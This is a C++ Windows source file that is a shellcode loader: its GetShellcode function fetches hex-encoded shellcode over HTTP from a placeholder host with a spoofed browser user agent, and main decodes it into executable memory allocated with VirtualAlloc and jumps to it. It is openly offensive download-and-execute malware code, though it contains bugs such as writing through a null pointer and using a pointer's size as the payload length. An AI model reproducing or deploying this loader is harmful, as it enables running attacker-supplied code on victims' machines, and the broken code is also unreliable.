#define _CRT_SECURE_NO_WARNINGS
#include <vector>
#include <winsock2.h>
#include <Winhttp.h>
#include <windows.h>
#include <iostream>
#include <sstream>
#include <string>
#include <algorithm>
#include <typeinfo>
#include "AtlBase.h"
#include "AtlConv.h"
#include "string.h"
using namespace std;
#pragma comment(lib, "winhttp")

string GetShellcode(string strHost, string strRequestStr, int port)
{
    string header = "Host: " + strHost + "\r\nContent-type: application/x-www-form-urlencoded\r\nCache-Control: max-age=0\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.8\r\n";
    USES_CONVERSION;
    LPCWSTR host = A2CW(strHost.c_str());
    LPCWSTR requestStr = A2CW(strRequestStr.c_str());
    //Variables
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    vector <string>  vFileContent;
    BOOL  bResults = FALSE;

    //Note the definition of HINTERNET
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    string strHtml = "";// store the html code

// Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, host,
            (INTERNET_PORT)port, 0);
    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", requestStr,
            NULL, WINHTTP_NO_REFERER,
            NULL,
            NULL);

    //Add HTTP header 
    LPCWSTR header1 = A2CW(header.c_str());
    SIZE_T len = lstrlenW(header1);
    WinHttpAddRequestHeaders(hRequest, header1, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    //obtain the html source code
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());
            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                {
                    printf("Error %u in WinHttpReadData.\n",
                        GetLastError());
                }
                else
                {
                   // Data in vFileContent
                    vFileContent.push_back(pszOutBuffer);

                }
                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
        // Keep checking for data until there is nothing left.
       // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());
        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        for (int i = 0; i < (int)vFileContent.size(); i++)
        {
            strHtml += vFileContent[i];
        }
        return strHtml;
}


unsigned char hex_2_dec(unsigned char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
}

int main(int argc, char** argv)
{

    string str = GetShellcode("ip", "?shellcode=1", 80);
    cout << str << endl;
    int len = strlen((char*)str.c_str());
    unsigned char t1;
    char* code = NULL;
    for (int i = 1; i <= len; i += 2) {
        t1 = hex_2_dec(str.c_str()[i - 1]);
        t1 = 16 * t1 + hex_2_dec(str.c_str()[i]);
        code[i / 2] = t1;
    }
    

    //void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
    //memcpy(exec, code, memory_allocation);
    //DWORD ignore;
    //VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
    //(*(void (*)()) exec)();

    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, code, sizeof(code));
    ((void(*)())exec)();
}